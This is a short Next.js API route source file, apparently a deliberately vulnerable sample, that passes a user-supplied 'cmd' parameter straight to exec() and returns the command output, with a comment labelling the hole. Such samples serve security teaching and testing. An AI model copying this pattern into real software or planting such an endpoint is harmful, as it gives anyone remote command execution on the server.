// pages/api/rce.ts
import type { NextApiRequest, NextApiResponse } from 'next'
import { exec } from 'child_process'

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  // Grab ?cmd= from query or JSON body
  const raw = typeof req.query.cmd === 'string'
    ? req.query.cmd
    : (req.body?.cmd as string | undefined)

  if (!raw) {
    return res.status(400).json({ error: 'Provide ?cmd=<command> or { "cmd": "…" }' })
  }

  // ───▶ VULNERABILITY: unsanitized user input passed straight to exec()
  exec(raw, { timeout: 5000 }, (err, stdout, stderr) => {
    if (err) {
      return res.status(500).json({ error: err.message, stderr })
    }
    res.status(200).json({ stdout, stderr })
  })
}

